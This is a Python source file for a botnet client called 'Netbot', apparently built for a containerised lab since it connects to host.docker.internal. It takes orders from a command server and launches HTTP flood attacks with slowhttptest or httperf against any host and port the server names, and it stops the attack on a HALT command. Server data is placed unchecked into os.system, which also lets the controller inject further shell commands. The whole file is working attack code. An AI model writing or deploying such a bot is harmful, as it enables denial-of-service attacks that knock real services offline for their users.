import os
import socket
import signal
import sys
import time

pid = -1

def signal_handler(sig, frame):
    if pid > 0:
        os.killpg(pid, signal.SIGKILL)
    sys.exit(sig)

def main():
    global pid
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        sys.stderr.write("[ERROR] %s\n" % msg[1])
        sys.exit(1)

    server_address = ("host.docker.internal", 8080)
    sock.connect(server_address)

    message = b'Hello'
    sock.sendall(message)
    print("[INFO] Netbot connected to the server successfully!")

    signal.signal(signal.SIGINT, signal_handler)

    while True:
        data = sock.recv(1024)
        if data == b'':
            sock.close()
            os.killpg(pid, signal.SIGKILL)
            sys.exit(0)

        if data[:4] == b'HALT':
            os.killpg(pid, signal.SIGKILL)
            print(f"[INFO] Killing the process group with PID {pid}")
            os.system("clear")
            print(f"Attack halted. Waiting for Server's command...")
            continue

        if pid > 0:
            os.killpg(pid, signal.SIGKILL)

        pid = os.fork()
        if pid == 0:
            os.setpgid(os.getpid(), os.getpid())
            seglist = data.decode().split('_')

            if seglist[0][:8] == 'SLOWHTTP':
                cmd = f"slowhttptest -H -u http://{seglist[1]}:{seglist[2]} -t GET -c 500 -r 30 -p 20 -l 3600"
            elif seglist[0][:8] == 'FASTHTTP':
                cmd = f"httperf --server {seglist[1]} --port {seglist[2]} --uri / --num-conns 10000 --rate 500"

            os.system(cmd)

        while True:
            time.sleep(1000)

        return
    
if __name__ == '__main__':
    main()





            

        

    